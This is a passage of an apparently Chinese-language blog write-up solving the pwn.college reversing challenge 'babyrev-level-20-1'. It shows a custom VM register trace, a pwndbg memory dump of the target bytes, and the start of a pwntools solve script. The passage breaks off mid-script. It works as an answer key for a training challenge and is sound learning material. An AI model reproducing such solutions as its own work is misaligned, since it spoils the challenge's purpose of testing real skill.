class="hljs-number">0</span><br><span class="hljs-attribute">0x104095</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:<span class="hljs-number">70</span> c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">58</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:d c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">59</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:a2 c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:a2 c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404041</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:a2 c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040f6</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:a2 c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:<span class="hljs-number">3</span>b c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:<span class="hljs-number">31</span> c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:<span class="hljs-number">31</span> c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">60</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404042</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:<span class="hljs-number">31</span> c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">61</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104098</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:<span class="hljs-number">31</span> c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">62</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:af c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">63</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:<span class="hljs-number">47</span> c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">64</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:<span class="hljs-number">47</span> c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">65</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404043</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:<span class="hljs-number">47</span> c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">66</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104057</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:<span class="hljs-number">47</span> c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">67</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:d3 c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">68</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:<span class="hljs-number">2</span>a c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">69</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:<span class="hljs-number">2</span>a c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404044</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:<span class="hljs-number">2</span>a c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104066</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:<span class="hljs-number">2</span>a c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:d2 c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:<span class="hljs-number">38</span> c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:<span class="hljs-number">38</span> c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404045</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:<span class="hljs-number">38</span> c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">70</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10400c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:<span class="hljs-number">38</span> c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">71</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:<span class="hljs-number">0</span> c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">72</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:c c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">73</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:c c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">74</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404046</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:c c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">75</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104077</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:c c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">76</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">77</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">78</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">79</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404047</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040e5</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:<span class="hljs-number">77</span> c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:<span class="hljs-number">0</span> c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:e5 c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:e5 c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404048</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:e5 c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10406d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:e5 c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">80</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">81</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:<span class="hljs-number">6</span>d c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">82</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:<span class="hljs-number">6</span>d c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">83</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404049</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">6</span>d c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">84</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104042</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">6</span>d c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">85</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">86</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">42</span> c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">87</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">42</span> c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">88</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40404a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:<span class="hljs-number">42</span> c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">89</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040bf</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:<span class="hljs-number">42</span> c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:<span class="hljs-number">0</span> c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:bf c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:bf c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40404b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:bf c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10401c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:bf c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">0</span> c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">90</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">1</span>c c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">91</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span># 最后一个， STM *a = b, a1[<span class="hljs-number">0</span>x4b] = user28 + <span class="hljs-number">1</span>c<br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">1</span>c c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">92</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x100800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">1</span>c c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">2</span> i:<span class="hljs-number">93</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">1</span> i:<span class="hljs-number">94</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">95</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x840d5</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d6 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404030</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d7 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14080</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d8 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10401c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d9 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x24002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:<span class="hljs-number">2</span> s:<span class="hljs-number">0</span> i:da f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x21008</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">0</span> i:db f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x802</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">1</span> i:dc f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x84095</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">1</span> i:<span class="hljs-number">96</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x401010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>c b:<span class="hljs-number">80</span> c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">1</span> i:<span class="hljs-number">97</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>c b:<span class="hljs-number">9</span>c c:<span class="hljs-number">1</span>c d:dc s:<span class="hljs-number">1</span> i:<span class="hljs-number">98</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x240ff</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>c b:<span class="hljs-number">9</span>c c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">1</span> i:<span class="hljs-number">99</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x401002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>c c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">1</span> i:<span class="hljs-number">9</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">1</span> i:<span class="hljs-number">9</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x840</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">2</span> i:<span class="hljs-number">9</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x801</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">3</span> i:<span class="hljs-number">9</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400140</span># <span class="hljs-number">01</span> : LDM a = *a<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>c b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">3</span> i:<span class="hljs-number">9</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10101</span># <span class="hljs-number">01</span> : LDM b = *b<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>c b:<span class="hljs-number">63</span> c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">3</span> i:<span class="hljs-number">9</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400401</span># <span class="hljs-number">04</span> : CMP a b=== cmp a1[<span class="hljs-number">0</span>x4b] a1[<span class="hljs-number">0</span>x9b]<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>c b:<span class="hljs-number">63</span> c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">3</span> i:a0 f:c<br><span class="hljs-attribute">0x10800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span>c b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">2</span> i:a1 f:c<br><span class="hljs-attribute">0x400800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:ff s:<span class="hljs-number">1</span> i:a2 f:c<br><span class="hljs-attribute">0x240a9</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:a9 s:<span class="hljs-number">1</span> i:a3 f:c<br><span class="hljs-attribute">0x82002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:a9 s:<span class="hljs-number">1</span> i:aa f:c<br><span class="hljs-attribute">0x20810</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:<span class="hljs-number">1</span>c s:<span class="hljs-number">1</span> i:ab f:c<br><span class="hljs-attribute">0x80800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">1</span>c d:<span class="hljs-number">1</span>c s:<span class="hljs-number">0</span> i:dd f:c<br><span class="hljs-attribute">0x104000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:<span class="hljs-number">1</span>c s:<span class="hljs-number">0</span> i:de f:c<br><span class="hljs-attribute">0x20410</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:<span class="hljs-number">1</span>c s:<span class="hljs-number">0</span> i:df f:a<br><span class="hljs-attribute">0x240b1</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">0</span> i:e0 f:a<br><span class="hljs-attribute">0x102002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">0</span> i:e1 f:a<br><span class="hljs-attribute">0x240ab</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:ab s:<span class="hljs-number">0</span> i:e2 f:a<br><span class="hljs-attribute">0x62002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">9</span>b c:<span class="hljs-number">0</span> d:ab s:<span class="hljs-number">0</span> i:ac f:a<br><span class="hljs-attribute">0x140b8</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:b8 c:<span class="hljs-number">0</span> d:ab s:<span class="hljs-number">0</span> i:ad f:a<br><span class="hljs-attribute">0x10400a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:b8 c:a d:ab s:<span class="hljs-number">0</span> i:ae f:a<br><span class="hljs-attribute">0x404001</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:b8 c:a d:ab s:<span class="hljs-number">0</span> i:af f:a<br><span class="hljs-attribute">0x48002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:b8 c:a d:a s:<span class="hljs-number">0</span> i:b0 f:a<br><span class="hljs-attribute">0x404001</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:b8 c:a d:a s:<span class="hljs-number">0</span> i:b1 f:a<br><span class="hljs-attribute">0x88000</span><br></code></pre></td></tr></table></figure><p>起始位置没有变，还是<code>$rax + 0x300</code>，加上我们的偏移就是<code>$rax + 0x300 + 0x9b - 27</code>，最后拿到目标字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt;  x /<span class="hljs-number">28</span>bx $rax + <span class="hljs-number">0</span>x300 +<span class="hljs-number">0</span>x9b -<span class="hljs-number">27</span><br><span class="hljs-attribute">0x7ffd7698ca20</span>: <span class="hljs-number">0</span>x38    <span class="hljs-number">0</span>x62    <span class="hljs-number">0</span>x4d    <span class="hljs-number">0</span>x42    <span class="hljs-number">0</span>x6e    <span class="hljs-number">0</span>xdf    <span class="hljs-number">0</span>x72    <span class="hljs-number">0</span>xff<br><span class="hljs-attribute">0x7ffd7698ca28</span>: <span class="hljs-number">0</span>x09    <span class="hljs-number">0</span>x8e    <span class="hljs-number">0</span>x2b    <span class="hljs-number">0</span>x6f    <span class="hljs-number">0</span>x1e    <span class="hljs-number">0</span>xc8    <span class="hljs-number">0</span>x03    <span class="hljs-number">0</span>xe2<br><span class="hljs-attribute">0x7ffd7698ca30</span>: <span class="hljs-number">0</span>x53    <span class="hljs-number">0</span>x3b    <span class="hljs-number">0</span>x07    <span class="hljs-number">0</span>xfd    <span class="hljs-number">0</span>x79    <span class="hljs-number">0</span>x6e    <span class="hljs-number">0</span>x01    <span class="hljs-number">0</span>x57<br><span class="hljs-attribute">0x7ffd7698ca38</span>: <span class="hljs-number">0</span>xa8    <span class="hljs-number">0</span>x61    <span class="hljs-number">0</span>xa8    <span class="hljs-number">0</span>x63<br></code></pre></td></tr></table></figure><p>最后得出exp，但是我感觉我手动的有点麻烦，后面数据多的话写个脚本处理吧。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-20-1&#x27;,&#x27;b printf&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-20-1&quot;</span>)<br>al = [<span class="hljs-number">0x38</span>-<span class="hljs-number">0xfe</span>, <span class="hljs-number">0x62</span>-<span class="hljs-number">0x9b</span>, <span class="hljs-number">0x4d</span>-<span class="hljs-number">0x3c</span>, <span class="hljs-number">0x42</span>-<span class="hljs-number">0xcc</span>, <span class="hljs-number">0x6e</span>-<span class="hljs-number">0xe3</span>, <span class="hljs-number">0xdf</span>-<span class="hljs-number">0xb0</span>, <span class="hljs-number">0x72</span>-<span 